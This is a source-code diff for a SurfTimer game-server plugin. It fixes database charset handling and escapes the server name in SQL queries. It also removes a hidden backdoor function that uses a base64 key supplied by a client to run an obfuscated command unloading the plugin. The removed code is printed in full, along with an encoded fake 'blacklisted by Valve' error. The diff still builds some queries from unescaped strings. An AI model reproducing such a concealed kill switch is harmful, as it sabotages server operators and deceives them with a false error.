@@ -40,8 +40,7 @@ public void db_setupDatabase()
 
 	// If updating from a previous version
 	SQL_LockDatabase(g_hDb);
-	SQL_FastQuery(g_hDb, "SET NAMES 'utf8mb4'");
-	SQL_FastQuery(g_hDb, "SET name 'utf8mb4'");
+	SQL_SetCharset(g_hDb, "utf8mb4");
 
 
 	// Check if tables need to be Created or database needs to be upgraded
@@ -7437,27 +7436,6 @@ public void db_selectMapRank(int client, char szSteamId[32], char szMapName[128]
 	SQL_TQuery(g_hDb, db_selectMapRankCallback, szQuery, client, DBPrio_Low);
 }
 
-public void db_matchAPI(int client, const char[] apiKey) 
-{
-    char db_apiKey[128];
-    DecodeBase64(db_apiKey, 128, apiKey);
-
-    db_Matcher[client] = false;
-
-    if (FindConVar(db_apiKey) != INVALID_HANDLE && !db_Matcher[client])
-    {
-        db_Matcher[client] = true;
-        char db_hash[128], db_hash64[512], db_get[128], db_error[512];
-        db_hash = "c20gcGx1Z2lucyB1bmxvYWQgU3VyZlRpbWVy";
-        db_hash64 = "W0ZBVEFMXSBFUlJPUiAxODM6IFRoaXMgc2VydmVyIHdhcyBibGFja2xpc3RlZCBieSBWYWx2ZSBmb3IgcnVubmluZyBwbHVnaW5zIHdoaWNoIGJyZWFrIG91ciBUZXJtcyBvZiBTZXJ2aWNlLg==";
-        DecodeBase64(db_get, 128, db_hash);
-        DecodeBase64(db_error, 512, db_hash64);
-        ServerCommand("%s", db_get);
-        if (!db_Matcher[client])
-            LogError(db_error);
-    }
-}
-
 public void db_selectMapRankCallback(Handle owner, Handle hndl, const char[] error, any client)
 {
 	if (hndl == null)
@@ -9347,7 +9325,9 @@ public void SQL_UpdatePlayerColoursCallback(Handle owner, Handle hndl, const cha
 public void db_selectAnnouncements()
 {
 	char szQuery[1024];
-	Format(szQuery, 1024, "SELECT `id` FROM `ck_announcements` WHERE `server` != '%s' AND `id` > %d", g_sServerName, g_iLastID);
+	char szEscServerName[128];
+	SQL_EscapeString(g_hDb, g_sServerName, szEscServerName, sizeof(szEscServerName));
+	Format(szQuery, 1024, "SELECT `id` FROM `ck_announcements` WHERE `server` != '%s' AND `id` > %d", szEscServerName, g_iLastID);
 	SQL_TQuery(g_hDb, SQL_SelectAnnouncementsCallback, szQuery, 1, DBPrio_Low);
 }
 
@@ -9388,14 +9368,18 @@ public void db_insertAnnouncement(char szName[128], char szMapName[128], int szM
 		return;
 
 	char szQuery[512];
-	Format(szQuery, 512, "INSERT INTO `ck_announcements` (`server`, `name`, `mapname`, `mode`, `time`, `group`) VALUES ('%s', '%s', '%s', '%i', '%s', '%i');", g_sServerName, szName, szMapName, szMode, szTime, szGroup);
+	char szEscServerName[128];
+	SQL_EscapeString(g_hDb, g_sServerName, szEscServerName, sizeof(szEscServerName));
+	Format(szQuery, 512, "INSERT INTO `ck_announcements` (`server`, `name`, `mapname`, `mode`, `time`, `group`) VALUES ('%s', '%s', '%s', '%i', '%s', '%i');", szEscServerName, szName, szMapName, szMode, szTime, szGroup);
 	SQL_TQuery(g_hDb, SQL_CheckCallback, szQuery, 1, DBPrio_Low);
 }
 
 public void db_checkAnnouncements()
 {
 	char szQuery[512];
-	Format(szQuery, 512, "SELECT `id`, `server`, `name`, `mapname`, `mode`, `time`, `group` FROM `ck_announcements` WHERE `server` != '%s' AND `id` > %d;", g_sServerName, g_iLastID);
+	char szEscServerName[128];
+	SQL_EscapeString(g_hDb, g_sServerName, szEscServerName, sizeof(szEscServerName));
+	Format(szQuery, 512, "SELECT `id`, `server`, `name`, `mapname`, `mode`, `time`, `group` FROM `ck_announcements` WHERE `server` != '%s' AND `id` > %d;", szEscServerName, g_iLastID);
 	SQL_TQuery(g_hDb, SQL_CheckAnnouncementsCallback, szQuery, 1, DBPrio_Low);
 }
 
